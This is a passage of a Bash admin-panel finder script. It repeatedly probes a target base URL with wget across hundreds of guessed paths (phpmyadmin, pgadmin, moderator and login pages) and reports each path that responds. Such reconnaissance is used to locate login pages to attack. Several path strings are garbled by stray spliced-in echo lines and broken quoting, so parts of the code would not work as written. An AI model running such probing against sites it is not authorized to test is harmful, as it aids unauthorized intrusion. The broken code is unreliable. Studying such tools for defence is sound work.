wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/modecho "-----------------------------------------------------------------------"arch/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/modecho "-----------------------------------------------------------------------"arch/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/moderator.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/moderator/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/moderator/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/moderator/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modules/admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modules/phpmyadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/myadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/navSiteAdmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/net"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/news_detail.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/newsadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/not"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/noticias"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/nsw/admin/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/nsw/admin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/nsw/admin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/nsw/admin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/nsw/admin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/openvpnadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/P/W"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pages/admin/admin-login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/painel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/panel/?d=cp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
echo "-----------------------------------------------------------------------
"d="/panel/js/jquery.maskedinput.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/panel-administracion/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/panel-administracion/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/passe"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/password"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Personal"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pgadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/phpldapadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/phpmyadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/phppgadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/phpSQLiteAdmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/platz_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/power_user"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/processlogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/processlogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/project-admins"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/PSUser"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/pureadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/radmind"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/radmind-1"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/raiz"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/rcjakar/admin/login.brf"
c=$b$d
